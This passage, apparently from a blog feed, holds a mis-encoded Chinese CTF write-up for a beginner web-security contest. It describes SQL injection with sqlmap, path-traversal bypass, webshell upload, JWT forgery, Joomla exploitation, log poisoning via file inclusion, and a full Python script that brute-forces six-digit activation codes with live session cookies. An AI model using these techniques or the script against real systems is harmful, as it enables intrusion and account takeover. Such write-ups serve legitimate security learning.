src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844777186-589af012-72be-4582-82c3-f3216fb7b139.png"></p><p>æ‰“å¼€ä¹‹åå‘ç°é‡Œé¢æ­£æ˜¯/etc/passwdçš„å†…å®¹ï¼Œé‚£å°±åªè¦çŒœä¸€ä¸‹flagçš„ç›®å½•å³å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">![f1](/flag)<br>![f2](/flag.txt)<br>![f3](/app/flag)<br>![f4](/home/ctf/flag)<br></code></pre></td></tr></table></figure><p>å†æ¬¡æäº¤ä¹‹åä¹Ÿæ˜¯æˆåŠŸå¾—åˆ°flag</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769844836056-9feb4eb5-c5da-471c-b0ce-fc4f271f12a9.png"></p><h1 id="ç ´é˜µé˜è®­ç»ƒèµ›"><a href="#ç ´é˜µé˜è®­ç»ƒèµ›" class="headerlink" title="ç ´é˜µé˜è®­ç»ƒèµ›"></a>ç ´é˜µé˜è®­ç»ƒèµ›</h1><p>è¿™ä¸ªæ¯”èµ›æŒºé€‚åˆæ–°æ‰‹çš„ï¼Œå°±æ˜¯åˆšå¼€å§‹çš„æ—¶å€™å®¹å™¨æ‰“ä¸å¼€ï¼Œæ¯”èµ›è¿˜åªæœ‰3å°æ—¶</p><h2 id="æœ€ç®€å•çš„Webå®‰å…¨å…¥é—¨"><a href="#æœ€ç®€å•çš„Webå®‰å…¨å…¥é—¨" class="headerlink" title="æœ€ç®€å•çš„Webå®‰å…¨å…¥é—¨"></a>æœ€ç®€å•çš„Webå®‰å…¨å…¥é—¨</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841206414-d05748b9-d028-4412-9884-f97eee2ba79c.png"><br>idåŠ å¼•å·æœ‰æŠ¥é”™ï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769841233836-20a47719-64fb-4535-bc28-d76816db4a76.png"></p><h2 id="å®‰å…¨ç‰›çš„ERP"><a href="#å®‰å…¨ç‰›çš„ERP" class="headerlink" title="å®‰å…¨ç‰›çš„ERP"></a>å®‰å…¨ç‰›çš„ERP</h2><p>è®¿é—®ä¹‹åæ˜¯ç™»å½•é¡µé¢ï¼Œè¯•äº†å¸¸è§çš„å¼±å£ä»¤æ— æœï¼Œç„¶åæ¥æ‰«è·¯å¾„</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769846559506-c5e6f500-bbde-499a-ae98-4093a7d31b31.png"></p><p>å‘ç°ä¸€ä¸ªapiæ–‡æ¡£é¡µé¢ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å¥½åƒæ²¡å•¥ç”¨ï¼Œæ²¡åŠæ³•æ³¨å†Œæ–°ç”¨æˆ·ï¼Œåº”è¯¥è¿˜æ˜¯è¦å¾€è·¯å¾„ç»•è¿‡è¿™æ–¹é¢å»æƒ³ï¼Œåœ¨Geminiçš„å¤šä¸ªæµ‹è¯•payloadä¸‹æˆåŠŸç»•è¿‡</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847906288-11125c06-56ea-4ff2-a1dd-8277cd79cdf9.png"></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769847915924-26b4b155-50e1-4b03-954c-53d019b3b370.png"></p><p>å…¶å®ä¸€å¼€å§‹å°±æµ‹è¯•äº†../ï¼Œä½†æ˜¯å¯èƒ½æ˜¯ç›´æ¥åœ¨æµè§ˆå™¨è¾“å…¥çš„åŸå› ï¼Œæ²¡æœ‰ç»•è¿‡ï¼Œç°åœ¨åœ¨yakitè¯•äº†ä¸€ä¸‹ç›´æ¥æˆåŠŸäº†</p><h2 id="æ¿€è¿›çš„å¼€å‘è€…"><a href="#æ¿€è¿›çš„å¼€å‘è€…" class="headerlink" title="æ¿€è¿›çš„å¼€å‘è€…"></a>æ¿€è¿›çš„å¼€å‘è€…</h2><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848119716-e9080ad4-3cea-4be4-af56-062b1c772ef3.png"></p><p>æ ¹æ®è¿™ä¸ªæè¿°ï¼Œå…ˆæ‰«ä¸€æ³¢ç›®å½•è¯•è¯•</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848180960-8eef4365-9d0e-4c2b-9b41-e079ebe0eeb8.png"></p><p>config.phpæ— å†…å®¹ï¼Œå¯èƒ½éœ€è¦å‚æ•°ï¼Œä½†æ˜¯ç›®å‰è¿˜ä¸çŸ¥é“ï¼Œå…ˆæ³¨å†Œè´¦å·è¯•è¯•</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848401993-0f95f738-b655-44eb-86f4-c38efd7b1ccf.png"></p><p>ç™»å½•ä¸Šä¹‹åç–‘ä¼¼æœ‰æ³¨å…¥ç‚¹ï¼Œsqlmapå—¦ä¸€æŠŠçœ‹çœ‹</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848437974-6b7ef6e3-059f-4a10-abdc-6af1613ba233.png"></p><p>ç™»ä¸Šå»ä¹‹åæœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼ webshell</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848545719-d66e966e-b715-4c70-b404-cb62ba8730bd.png"></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848656221-ae336453-f922-451f-818a-88a3ac295e3a.png"></p><p>çœ‹æ¥ä¸€å¥è¯æœ¨é©¬ä¸è¡Œäº†ï¼Œè¦ä¸Šèšå‰‘æ‰è¡Œï¼Œå¥½å§ï¼Œæ˜¯æˆ‘æƒ³å¤šäº†ï¼Œflagåœ¨/home/www-dataç›®å½•ä¸‹</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769848924811-8f304c95-455b-4ccb-a52a-345f78122079.png"></p><h2 id="è´¼ç‰›æ°çš„èº«ä»½é‰´æƒï¼Œè¿˜æ€•åœ¨å¤±é™·ï¼Ÿ"><a href="#è´¼ç‰›æ°çš„èº«ä»½é‰´æƒï¼Œè¿˜æ€•åœ¨å¤±é™·ï¼Ÿ" class="headerlink" title="è´¼ç‰›æ°çš„èº«ä»½é‰´æƒï¼Œè¿˜æ€•åœ¨å¤±é™·ï¼Ÿ"></a>è´¼ç‰›æ°çš„èº«ä»½é‰´æƒï¼Œè¿˜æ€•åœ¨å¤±é™·ï¼Ÿ</h2><p>è®¿é—®ä¹‹åæ˜¯ç™»å½•ï¼Œç™»å½•å¤±è´¥ä¼šç»™ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„è´¦å·ï¼Œç™»å½•ä¹‹åæŠ“åŒ…èƒ½çœ‹åˆ°tokenï¼Œç»“åˆé¢˜ç›®æè¿°ï¼Œåº”è¯¥æ˜¯jwtä¼ªé€ </p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850131488-8ced480b-63e3-4be0-8aef-088b93530a39.png"></p><p>ç„¶åæ‹¿å»ä¼ªé€ ä¸€ä¸ªadminçš„token<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850196592-33f7ebf0-21c8-4d9a-b810-353a1b705966.png"></p><p>ç„¶åæ‹¿åˆ°flag</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769850209454-4a5159fb-258b-4e5a-bf1d-0e571222b90b.png"></p><h2 id="å°å°çš„æŒ‘æˆ˜"><a href="#å°å°çš„æŒ‘æˆ˜" class="headerlink" title="å°å°çš„æŒ‘æˆ˜"></a>å°å°çš„æŒ‘æˆ˜</h2><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769855572576-9f9bd0d0-24e9-4f34-98d1-b58a20d575e6.png"></p><p>åœ¨è·¯å¾„ä¸­çš„htaccess.txtä¸­å¯ä»¥çœ‹åˆ°è¿™æ˜¯joomla</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858438407-178802ab-f8ab-44ce-a080-02b6ef913f86.png"></p><p>å…¶å®ç†Ÿæ‚‰çš„äººçœ‹åˆ°è¿™äº›è·¯å¾„åº”è¯¥å°±èƒ½çŒœå‡ºæ¥è¿™æ˜¯joomla</p><p>ç„¶åå¯ä»¥ç”¨<code>/administrator/manifests/files/joomla.xml</code>è·¯å¾„åˆ¤æ–­joomlaçš„å…·ä½“ç‰ˆæœ¬</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858495744-a71ce08c-83d7-4f21-8893-c9524e0a823a.png"></p><p>æœ‰äº†å…·ä½“ç‰ˆæœ¬å°±å¥½åŠäº†ï¼Œç›´æ¥æœè¯¥ç‰ˆæœ¬å¯¹åº”çš„expå°±è¡Œ</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858586168-0cd0a1df-6d0b-47af-9c0d-0a8f76e56e19.png"></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859013476-53b2a2c5-430d-4deb-a0fa-9240e2caed38.png"></p><p>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­ç»™äº†å…·ä½“ç‚¹ï¼Œsqlmapå‘½ä»¤éƒ½ç»™äº†ï¼Œç›´æ¥ç…§ç€è¿è¡Œå³å¯ï¼Œä½†æ˜¯åˆ°åé¢çˆ†æ•°æ®çš„æ—¶å€™é‡åˆ°é—®é¢˜äº†ï¼Œè¿™ä¸ªé‡Œé¢çš„è¡¨å…¨æ˜¯<code>#__</code>å¼€å¤´ï¼Œè¿™å¯¼è‡´sqlmapä¸å¤ªå¥½è·‘ï¼Œæˆ‘è¿™é‡Œç”¨Geminiç»™çš„payloadæ‰‹å·¥ç¼–ç ä¹‹åå†æ³¨å…¥</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769858894156-7e1502bd-ff7e-4559-b88a-5bb32e50dfbc.png"></p><p>å¾—åˆ°hashï¼Œç„¶åkaliçˆ†ç ´ä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">2y$10<span class="hljs-variable">$1XJmZJy0fG3u6LaYOj3n5eB8j6gocddi1c4rieSQ1VbgxTxWBGtGa</span></span><br></code></pre></td></tr></table></figure><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859037802-a90d3400-494a-4616-ac40-84ef4dcb023f.png"></p><p>ç„¶åå»<code>/administrator/index.php</code>ç™»å½•ç®¡ç†å‘˜åå°ï¼Œç„¶ååœ¨templateå¤„æ·»åŠ æ¨¡æ¿<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859737024-ed57835e-41f5-4673-bd10-9b313a6875cf.png"></p><p>ç„¶åè¯»å–flagå³å¯</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859754293-955db0ef-b3f2-4c13-aff4-a3335e5b6f4c.png"></p><h2 id="é—å¿˜çš„è°ƒè¯•ä¿¡æ¯"><a href="#é—å¿˜çš„è°ƒè¯•ä¿¡æ¯" class="headerlink" title="é—å¿˜çš„è°ƒè¯•ä¿¡æ¯"></a>é—å¿˜çš„è°ƒè¯•ä¿¡æ¯</h2><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859903435-264e9da1-4bee-492d-8c26-557aa6615712.png"></p><p>æ ¹æ®ä»‹ç»ï¼Œè¿˜æ˜¯æ‰«ä¸€ä¸‹ç›®å½•</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769859920511-f91cc6dd-7847-436d-b62a-c9aada80ae13.png"></p><p>è¿™é¢˜å¾—å¤šæ‰¾å­—å…¸æ‰«</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769861343030-30efcd5d-8120-4f54-a1eb-a49c15035fbc.png"></p><p>ç„¶ååœ¨è¿™ä¸ªç›®å½•ä¸‹ä¸€ä¸ªä¸ªç¿»ï¼Œæ‰¾åˆ°æœ‰ä¸€ä¸ªinfo.phpæœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åŠŸèƒ½</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862209244-81f5d610-6b21-4904-b64e-f380df83903d.png"></p><p>ç°åœ¨æœ‰2ä¸ªæ€è·¯ï¼Œä¸€ä¸ªæ˜¯æ ¹æ®æ¨æµ‹ï¼Œflagæ–‡ä»¶åº”è¯¥æ˜¯åœ¨<code>/home/www-data/flag</code>ï¼Œè¯»å–å³å¯ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯å¾€æ—¥å¿—ä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨è¿™ä¸ªinfo.phpæ¥åŒ…å«</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862741529-f6f5e882-4abe-4c94-b584-69aaf7d5d99e.png"></p><p>ç„¶åå°±æ˜¯å¯ä»¥åœ¨ä¸€å¥è¯æœ¨é©¬é‡Œé¢ï¼Œåœ¨å‘½ä»¤æ‰§è¡Œçš„å‰åè¾“å‡ºä¸€ç‚¹ç‰¹æ®Šç¬¦å·ï¼Œä¸ç„¶æ‰¾èµ·æ¥å¾ˆéº»çƒ¦</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862801919-07004bf2-5bd0-40f6-b0c9-7a35a30055de.png"></p><h2 id="æœ‰ç‚¹é™åˆ¶ï¼Œä½†ä¸å¤š"><a href="#æœ‰ç‚¹é™åˆ¶ï¼Œä½†ä¸å¤š" class="headerlink" title="æœ‰ç‚¹é™åˆ¶ï¼Œä½†ä¸å¤š"></a>æœ‰ç‚¹é™åˆ¶ï¼Œä½†ä¸å¤š</h2><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769862913197-94463a70-22cc-49e5-941f-b45cf69f5cd1.png"><br>æ ¹æ®é¢˜ç›®æè¿°ï¼Œåº”è¯¥æ˜¯è¦ç»•è¿‡ä»€ä¹ˆ</p><p>æ‰«ç›®å½•æ‰«å‡ºè¿™äº›</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769865188999-c6c89441-8ff5-44e5-8ea9-c823644d4bbd.png"></p><p>ç„¶åæˆ‘ä»¬æ³¨å†Œè´¦å·ï¼Œæ³¨å†Œè´¦å·çš„æ—¶å€™è¦é‚®ç®±å’Œå…¶ä»–display nameè¦ç¨å¾®é•¿ä¸€ç‚¹ï¼Œä¸ç„¶ç™»å½•ä¸æˆåŠŸï¼Œå½“ç”¨åŒæ ·çš„ä¿¡æ¯æ³¨å†Œçš„æ—¶å€™æç¤ºé‚®ç®±å·²è¢«ä½¿ç”¨å°±æ˜¯æˆåŠŸäº†ï¼Œç„¶åç™»å½•æç¤ºè´¦å·æœªæ¿€æ´»ï¼Œè¦6ä½æ¿€æ´»ç ï¼Œè€Œæ­£å¥½æ¿€æ´»é¡µé¢éœ€è¦useridå’Œæ¿€æ´»ç </p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866409383-8c177ec7-27c7-492c-90c3-09998d32124f.png"></p><p>è€Œuseridå¯ä»¥åœ¨ä¸»é¡µæµ‹å‡ºæ¥</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769866461281-8fa34082-a7d0-46dc-8e5d-f222217d5932.png"></p><p>é‚£å°±æ˜¯çˆ†ç ´æ¿€æ´»ç äº†ï¼Œç„¶åè¦æ³¨æ„çš„ç‚¹æ˜¯æœ¬æ¬¡å“åº”åŒ…ä¸­çš„tokenè¦ä½œä¸ºä¸‹æ¬¡çˆ†ç ´æ—¶å‚æ•°é‡Œçš„tokenï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import re<br>from tqdm import tqdm<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">================= é…ç½®åŒº =================</span><br>BASE_URL = &quot;http://175.27.169.122:56858&quot;<br>ACTIVATE_URL = f&quot;&#123;BASE_URL&#125;/activate.php&quot;<br>USER_ID = &quot;14&quot;  # ä½ çš„ç”¨æˆ·ID<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å¡«å…¥ä½ å½“å‰çš„ Cookie</span><br>COOKIES = &#123;<br>    &quot;joomla_user_state&quot; : &quot;logged_in&quot; ,<br>    &quot;joomla_remember_me_30166589d367bfdbe43cc3254602628c&quot; : &quot;uz80UeRF5loDQe4f.VvBTLOKTKl765S7znfCc&quot; ,<br>    &quot;460ada11b31d3c5e5ca6e58fd5d3de27&quot; : &quot;590c2000212f07d77f838c8d19d7bff7&quot; ,<br>    &quot;6f12c8b01052b36ca2996b535ee18e8d&quot; : &quot;d75f5e0706132dc3e9a4a675691a3c3e&quot; ,<br>    &quot;PHPSESSID&quot; : &quot;f5fd35f4fde42898ee1c56e97507a403&quot; ,<br>    &quot;user&quot; : &quot;test&quot; ,<br>    &quot;pass&quot; : &quot;7110eda4d09e062aa5e4a390b0a572ac0d2c0220&quot;<br>&#125;<br><br>HEADERS = &#123;<br>    &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36&quot; ,<br>    &quot;Referer&quot; : ACTIVATE_URL ,<br>    &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">==========================================</span><br><br>def get_token(html) :<br>    &quot;&quot;&quot;ä½¿ç”¨æ­£åˆ™ä» HTML ä¸­æå–éšè—çš„ token&quot;&quot;&quot;<br>    # åŒ¹é… &lt;input type=&#x27;hidden&#x27; name=&#x27;token&#x27; value=&#x27;...&#x27;&gt;<br>    match = re.search( r&quot;name=&#x27;token&#x27; value=&#x27;(.*?)&#x27;&quot; , html )<br>    if match :<br>        return match.group( 1 )<br>    return None<br><br><br>def solve() :<br>    session = requests.Session()<br>    # å°†é¢„è®¾çš„ Cookie åŠ å…¥ Session<br>    for k , v in COOKIES.items() :<br>        session.cookies.set( k , v )<br><br>    # 1. è®¿é—®é¡µé¢è·å–åˆå§‹ Token<br>    print( &quot;[*] æ­£åœ¨è·å–åˆå§‹ Token...&quot; )<br>    res = session.get( ACTIVATE_URL , headers=HEADERS )<br>    current_token = get_token( res.text )<br><br>    if not current_token :<br>        print( &quot;[-] æ— æ³•è·å–åˆå§‹ Tokenï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ– Cookie&quot; )<br>        return<br><br>    print( f&quot;[+] åˆå§‹ Token: &#123;current_token&#125;&quot; )<br><br>    # 2. å¼€å§‹çˆ†ç ´ 000000 - 999999<br>    # ä½ å¯ä»¥æ ¹æ®éœ€è¦è°ƒæ•´èŒƒå›´<br>    for i in tqdm( range( 1000000 ) , desc=&quot;Brute Forcing&quot; ) :<br>        code = str( i ).zfill( 6 )  # æ ¼å¼åŒ–ä¸º 6 ä½æ•°å­—ï¼Œå¦‚ 000123<br><br>        data = &#123;<br>            &quot;userid&quot; : USER_ID ,<br>            &quot;activation_code&quot; : code ,<br>            &quot;token&quot; : current_token<br>        &#125;<br><br>        try :<br>            # å‘é€ POST è¯·æ±‚<br>            resp = session.post( ACTIVATE_URL , data=data , headers=HEADERS )<br><br>            # 3. ç»“æœåˆ¤æ–­<br>            # å¦‚æœæ¿€æ´»æˆåŠŸï¼Œé€šå¸¸é¡µé¢ä¼šè·³è½¬ï¼Œæˆ–è€…ä¸åŒ…å« &quot;failed&quot; å…³é”®å­—<br>            # ä½ éœ€è¦æ ¹æ®å®é™…æˆåŠŸçš„è¿”å›ç‰¹å¾ä¿®æ”¹è¿™é‡Œçš„åˆ¤æ–­é€»è¾‘<br>            if resp.status_code!=403 :<br>                print( f&quot;\n\n[SUCCESS] çˆ†ç ´æˆåŠŸï¼&quot; )<br>                print( f&quot;[*] æ¿€æ´»ç : &#123;code&#125;&quot; )<br>                print( f&quot;[*] å“åº”å†…å®¹: &#123;resp.text&#125;&quot; )  # æ‰“å°å‰200å­—ç¬¦<br>                break<br><br>            # 4. ã€å…³é”®ã€‘è·å–ä¸‹ä¸€ä¸ªåŒ…æ‰€éœ€çš„ Token<br>            # æœåŠ¡å™¨åœ¨å“åº”ä½“ä¸­ä¼šç»™å‡ºä¸‹ä¸€æ¬¡æ“ä½œçš„éšè— token<br>            current_token = get_token( resp.text )<br><br>            if not current_token :<br>                # å¦‚æœæ²¡æ‹¿åˆ° tokenï¼Œå¯èƒ½æ˜¯è¯·æ±‚å¤ªå¿«è¢«å°äº†æˆ–è€… Session å¤±æ•ˆ<br>                tqdm.write( f&quot;[!] è­¦å‘Šï¼šåœ¨å°è¯• &#123;code&#125; æ—¶æœªè·å–åˆ°æ–° Tokenï¼Œæ­£åœ¨é‡æ–°è·å–...&quot; )<br>                res = session.get( ACTIVATE_URL , headers=HEADERS )<br>                current_token = get_token( res.text )<br><br>        except Exception as e :<br>            tqdm.write( f&quot;[!] ç½‘ç»œé”™è¯¯: &#123;e&#125;&quot; )<br>            continue<br><br><br>if __name__ == &quot;__main__&quot; :<br>    solve()<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ç®¡ç†å‘˜ä¸»é¡µæºç ä¸­å¯ä»¥çœ‹åˆ°hashï¼Œæ˜¯sha-1ï¼Œæ‹¿å»è§£å¯†å³å¯</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769870918548-bff17011-a740-4101-853e-af6f25e867db.png"></p><p>è§£å¯†ç™»ä¸Šç®¡ç†å‘˜è´¦å·æœ‰ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„å…¥å£ï¼Œè¿™ä¸ªå…¥å£å°±æ˜¯blacklist.txtçš„é™åˆ¶ç‚¹</p><p>ç„¶åæ ¹æ®å¦‚æ­¤ç»•è¿‡å³å¯ï¼Œå› ä¸ºæˆ‘æ²¡è§£å¯†å‡ºå¯†ç æ¥ï¼Œå°±æ²¡åŠæ³•å»è¯•äº†ï¼Œä½†æ˜¯æ€è·¯åº”è¯¥æ˜¯è¿™æ ·çš„</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769871159794-2a2f7499-624f-405f-8254-88268680907e.png"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå­¦ä¹ ç¬”è®°5-TransformedMap</title>
    <link href="/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-TransformedMap/"/>
    <url>/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05-TransformedMap/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bugku-sqlæ³¨å…¥ wp</title>
    <link href="/bugku-sql%E6%B3%A8%E5%85%A5-wp/"/>
    <url>/bugku-sql%E6%B3%A8%E5%85%A5-wp/</url>
    
